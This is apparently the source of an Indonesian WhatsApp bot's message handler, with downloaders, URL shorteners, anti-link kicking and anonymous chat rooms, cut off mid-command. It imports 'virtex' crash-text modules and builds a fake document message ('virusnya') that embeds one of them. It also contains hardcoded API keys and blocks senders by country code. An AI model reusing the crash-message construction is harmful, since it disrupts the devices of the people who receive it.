// CREATE BY LEXXY OFFICIAL

"use strict";
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./function/Data_Server_Bot/Console_Data')
const { removeEmojis, bytesToSize, getBuffer, fetchJson, getRandom, getGroupAdmins, runtime, sleep, makeid, isUrl, generateProfilePicture } = require("./function/func_Server");
const { TelegraPh, UploadFileUgu, AnonFiles } = require("./function/uploader_Media");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./function/func_Addlist');
const { media_JSON, mess_JSON, setting_JSON, antilink_JSON, db_user_JSON, server_eror_JSON, welcome_JSON, db_menfes_JSON, db_respon_list_JSON, auto_downloadTT_JSON } = require('./function/Data_Location.js')
const { mediafireDl } = require('./function/scrape_Mediafire')
const { webp2mp4File } = require("./function/Webp_Tomp4")
const { bioskop, bioskopNow, latinToAksara, aksaraToLatin, gempa, gempaNow, jadwalTV, listJadwalTV, jadwalsholat} = require ('@bochilteam/scraper') 
const { listmenu, rulesBot, donasiBot } = require('./help')
const { jadibot, listJadibot } = require('./function/jadibot')
const itu_mark = 62895340684706 + "@s.whatsapp.net"

// database virtex
const { philips } = require('./function/virtex/philips')
const { virus } = require('./function/virtex/virus')
const { ngazap } = require('./function/virtex/ngazap')

const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const qs = require("querystring");
const fetch = require("node-fetch");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon()

const Exif = require("./function/set_WM_Sticker")
const exif = new Exif()

const msgFilter = require("./function/func_Spam");
const { stalkff, stalkml } = require("./function/func_Stalker");
const mekih = fs.readFileSync ('./function/mod.jpg')

let orang_spam = []
let medianya = []

const mess = mess_JSON
const setting = setting_JSON
const antilink = antilink_JSON
const db_user = db_user_JSON
const server_eror = server_eror_JSON
const welcomeJson = welcome_JSON
const db_menfes = db_menfes_JSON
const db_respon_list = db_respon_list_JSON
const auto_downloadTT = auto_downloadTT_JSON

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async(conn, msg, m, setting, store) => {
try {
let { ownerNumber, botName, smm_dana_nama, smm_dana_number } = setting
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = [`${setting.ownerNumber}`,"62895340684706@s.whatsapp.net"].includes(sender) ? true : false
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'

const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)

const isWelcome = isGroup ? welcomeJson.includes(from) : false
const isAntiLink = antilink.includes(from) ? true : false
const isAutoDownTT = auto_downloadTT.includes(from) ? true : false

const quoted = msg.quoted ? msg.quoted : msg
var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList

const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
	
const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

try {
var pp_user = await conn.profilePictureUrl(sender, 'image')
} catch {
var pp_user = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

const PathAuto = "./function/menuPath/"

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = conn.sendMessage(from, { text: teks, mentions: mems })
return res
} else {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

function monospace(string) {
return '```' + string + '```'
}

function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const virusnya = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `GuraBot-MD ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const q1 = q.split('&')[0];
const q2 = q.split('&')[1];
const q3 = q.split('&')[2];	

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

const reply = (teks) => {conn.sendMessage(from, { text: teks }, { quoted: msg })}

if (isGroup && isAntiLink) {
if (!isBotGroupAdmins) return reply('Untung Bot Bukan Admin')
var linkgce = await conn.groupInviteCode(from)
if (chats.includes(`https://chat.whatsapp.com/${linkgce}`)) {
reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(chats)) {
let bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isGroupAdmins) return reply(bvl)
if (fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await conn.sendMessage(from, { delete: msg.key })
mentions(`「 ANTILINK 」\n\n@${sender.split('@')[0]} Kamu mengirim link group, maaf bot akan kick kamu dari grup`, [sender])
await sleep(3000)
conn.groupParticipantsUpdate(from, [sender], "remove")
} else {
}
}

if (isGroup && isAutoDownTT){
if (chats.match(/(tiktok.com)/gi)){
await sleep(3000)
var tt_teks = await fetchJson(`https://api.itsrose.my.id/downloader/tiktok?url=${chats}`)
var tt_res = await fetchJson(`https://api.zeeoneofc.xyz/api/downloader/tiktok?url=${chats}&apikey=joG4Kin6`)
var teks_nya = `*Tiktok Downloader*

• Creator : ${tt_teks.author.unique_id}
• Desk : ${tt_teks.desc}
• Url : ${chats}`
let btn_tiktok = [{ buttonId: `.menu`, buttonText: { displayText: '🎭 Menu' }, type: 1 }, { buttonId: `.owner`, buttonText: { displayText: 'Owner👤' }, type: 1 }]
var but_tiktok = {
text: teks_nya,
footer: setting.footer,
buttons: btn_tiktok,
headerType: 1
}
conn.sendMessage(from, but_tiktok, {quoted: msg})
//conn.sendMessage(from,{video:{url:tt_res.result.nowm}, caption:'✅ Done'}, {quoted : msg})
conn.sendMessage(from,{video:{url:tt_teks.download.nowm}, caption:'✅ Done'}, {quoted : msg})
}}

if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
var get_data_respon = getDataResponList(from, chats, db_respon_list)
if (get_data_respon.isImage === false) {
conn.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, {
quoted: msg
})
} else {
conn.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: msg
})
}
}

const sendContact = (jid, numbers, name, quoted, mn) => {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return conn.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

function toRupiah(angka) {
var saldonyeini = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldonyeini += angkarev.substr(i, 3) + '.';
return '' + saldonyeini.split('', saldonyeini.length - 1).reverse().join('');
}

let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}

let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))}
}})
}

const cekPesan = (satu, dua) => { 
let x2 = false
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){x2 = i}})
if (x2 !== false) {
if (satu == "id"){ return db_menfes[x2].id }
if (satu == "teman"){ return db_menfes[x2].teman }
}
if (x2 == false) { return null } 
}

const setRoom = (satu, dua, tiga) => { 
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){
if (satu == "±id"){ db_menfes[i].id = tiga
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
if (satu == "±teman"){ db_menfes[i].teman = tiga 
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
}})
}

// auto read
//conn.readMessages([msg.key])

if (command === 'buatroom') {
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam Roomchat, Ketik *#stopchat* Untuk Menghentikan Sesi Chat.")
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
id: sender,
session: "buatroom",
data: {
penerima: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan Tulis Nomor Whatsapp Yg Ingin Di Ajak Ngobrol*\n\n*Contoh:* 62895340684706")
} else {
reply("Kamu Sedang Di Dalam Sesi Room Chat, Menunggu Konfirmasi Dari Penerima.")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "buatroom") {
if (chats.length === 0) return;
if (isNaN(chats)) return 
data_deposit.data.penerima = Number(chats);
if (data_deposit.data.penerima == sender.split('@')[0]) return reply('jangan nomor lu')
if (data_deposit.data.penerima == botNumber.split('@')[0]) return reply('itu kan nomor bot')
var cekap = await conn.onWhatsApp(chats+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${chats}\ntidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
data_deposit.session = "number_orang";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
var penerimanyo = data_deposit.data.penerima +'@s.whatsapp.net'
mentions(`Berhasil Mengirimkan Undangan Chat Ke @${penerimanyo.split('@')[0]} Tunggu Dia Menyetujui Undangan Tersebut Untuk Chat Secara Anonim`, [penerimanyo])
let roomC = `#${makeid(10)}`
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
var text_tersambung =`Seseorang Mengajak Chat, *Dari: Rahasia*, Silahkan Klik Button Jika Ingin Menghubungkan Chat`
let btn_room = [{ buttonId: `${prefix}buat_room_chat ${sender}|${data_deposit.data.penerima}@s.whatsapp.net|${roomC}`, buttonText: { displayText: 'Terima️' }, type: 1 }]
var but_room = {
text: text_tersambung,
footer: 'Klik Button Untuk Menerima Chat.',
buttons: btn_room,
mentions: [penerimanyo],
headerType: 1
}
conn.sendMessage(`${data_deposit.data.penerima}@s.whatsapp.net`, but_room)
}
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "setnamebot") {
if (chats.length === 0) return;
data_deposit.data.nama_baru = (chats)
data_deposit.session = "nama_barunya";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SETNAMABOT SUKSES*
_*ID:* @${sender.split('@')[0]}_
_*Nama Lama:* ${setting.botName}_
_*Nama Baru:* ${data_deposit.data.nama_baru}_
_*Waktu:* ${jam} WIB_`)
await sleep(2000)
setting.botName = data_deposit.data.nama_baru
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
await sleep(2000)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'changename') {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "changename",
data: {
nama_baru: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*namalu apa? biar bot ganti*")
} else {
reply("nama nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "changename") {
if (chats.length === 0) return;
data_deposit.data.nama_baru = (chats)
data_deposit.session = "nama_barunya";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SETNAMA SUKSES*
_*ID:* @${sender.split('@')[0]}_
_*Nama Lama:* ${cekUser("name", sender)}_
_*Nama Baru:* ${data_deposit.data.nama_baru}_
_*Waktu:* ${jam} WIB_`)
await sleep(1000)
setUser("±name", sender, data_deposit.data.nama_baru)
await sleep(2000)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'bitly_short') {
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "bitly_shortlink",
data: {
trannss: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim url yang ingin di shortilink ke bitly.*\n\n*Contoh:* https://google.com")
} else {
reply("Link url nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "bitly_shortlink") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)
let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/bitly?url=${data_deposit.data.trannss}&apikey=danzz`)
if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
data_deposit.session = "input_texttttranss";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SHORTLINK*

*TYPE*
https://bitly.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'tinyurl_short') {
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "tinyurl_shortlink",
data: {
trannss: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim url yang ingin di shortilink ke tinyurl.*\n\n*Contoh:* https://google.com")
} else {
reply("Link url nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "tinyurl_shortlink") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)
let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/tinyurl?url=${data_deposit.data.trannss}&apikey=danzz`)
if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
data_deposit.session = "input_texttttranss";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SHORTLINK*

*TYPE*
https://tinyurl.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'cuttly_short') {
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "cuttly_shortlink",
data: {
trannss: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim url yang ingin di shortilink ke cuttly.*\n\n*Contoh:* https://google.com")
} else {
reply("Link url nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "cuttly_shortlink") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)
let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/cuttly?url=${data_deposit.data.trannss}&apikey=danzz`)
if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
data_deposit.session = "input_texttttranss";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*SHORTLINK*

*TYPE*
https://cutt.ly/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
} else if (command === 'translate') {
if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "translate",
data: {
trannss: ""
}
}
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim text yang ingin jadi translate ke inggris.*\n\n*Contoh:* Hai sayang")
} else {
reply("Text nya mana kak?")
}
}

if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
if (data_deposit.session === "translate") {
if (chats.length === 0) return;
data_deposit.data.trannss = (chats)

var en = await fetchJson(`https://api.popcat.xyz/translate?to=en&text=${data_deposit.data.trannss}`) 
data_deposit.session = "input_texttttranss";
fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*TRANSLATE*
*IND :* ${data_deposit.data.trannss}
*EN :* ${en.translated}`)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
}
}
}

msgFilter.ResetSpam(orang_spam)

const spampm = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
msgFilter.addSpam(sender, orang_spam)
reply('Silahkan Jeda 5 Detik, Sebelum Menggunakan Command Berikutnya')
}

const spamgr = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
msgFilter.addSpam(sender, orang_spam)
reply('Silahkan Jeda 5 Detik, Sebelum Menggunakan Command Berikutnya')
}

if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm()
if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr()
if (isCmd && args.length < 1 && !isOwner) msgFilter.addFilter(sender)

if (sender.startsWith('212')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('91')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('92')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('90')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('54')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('55')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('40')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('94')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('60')) {
return conn.updateBlockStatus(sender, 'block')
}

if (isGroup && isCmd && !fromMe) {
console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!isGroup && isCmd && !fromMe) {
console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}

// Fake
const floc2 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { "liveLocationMessage": { "title": 'tes',"h": 'ok', 'jpegThumbnail': fs.readFileSync('./function/mod.jpg')}}} // lokasi terkini 

// Fake Broadcast
let bcnye = { key : { participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { locationMessage: { name: `_*「 Broadcast Bot 」*_`, jpegThumbnail: fs.readFileSync('./function/mod.jpg')}}}

conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
let buttonMessage = {
text,
footer,
buttons,
headerType: 2,
...options
}
conn.sendMessage(jid, buttonMessage, { quoted, ...options })
}

const pack_name = 'ᴹᴿ᭄ Arulོ ×፝֟͜×'
const aut_hor = 'WhatsApp Bot'

const button_nye = [
{ buttonId: `.menu`, buttonText: { displayText: '🎭 Menu' }, type: 1 }, 
{ buttonId: '.owner', buttonText: { displayText: 'Owner 👤' }, type: 1 }
]

switch(command) {

case 'ytmp3':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
reply(mess.wait)
let ngah = await fetchJson (`https://api.akuari.my.id/downloader/youtube3?link=${q}&type=360`)
let ngih = await fetchJson(`https://saipulanuar.ga/api/download/ytmp4?url=${q}&apikey=CxaNkDmT`)
let audio = ngih.result
let ntahlah = `*「 YouTube Mp3 」*

*💬 Title:* ${audio.title}
*▶️ Channel:* ${audio.channel}
*👀️ Views:* ${audio.views}
*🎥 Quality : ${ngah.mp4.type_download}
*🔡 Url:* ${q}
`
let buttonYtmp3 = {
image: { url: audio.thumb },
caption: ntahlah,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, buttonYtmp3, { quoted: msg })
conn.sendMessage(from, { audio: { url : ngah.audio.audio }, mimetype: 'audio/mpeg', fileName: `${ngah.title}.mp3` }, { quoted : msg })
break

case 'ytmp4':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
reply(mess.wait)
let ngoh = await fetchJson(`https://saipulanuar.ga/api/download/ytmp4?url=${q}&apikey=CxaNkDmT`)
let ngohh = await fetchJson(`https://api.akuari.my.id/downloader/youtube3?link=${q}&type=360`)
let pidio2 = ngohh.mp4
let pidio = ngoh.result
let meong = `*「 YouTube Mp4 」*

*💬 Title:* ${pidio.title}
*▶️ Channel:* ${pidio.channel}
*👀️ Views:* ${pidio.views}
*🎥 Quality : ${pidio2.type_download}
*🔡 Url:* ${q}
`
let buttonYoutube = {
image: { url: pidio.thumb },
caption: meong,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, buttonYoutube, { quoted: msg })
conn.sendMessage(from, { video: { url: pidio.url }, mimetype: 'video/mp4', fileName: `${pidio.title}.mp4`, caption: '✅ Done' }, { quoted: msg })
break

case 'tiktok':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
reply(mess.wait)
let anong = await fetchJson(`https://api.itsrose.my.id/downloader/tiktok?url=${q}`)
let tt4 = anong.download
conn.sendMessage(from, { video: { url: tt4.nowm }, mimetype: 'video/mp4', fileName: `ok.mp4`, caption: '✅ Done' }, { quoted: msg })
break

case 'kapankah': {
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
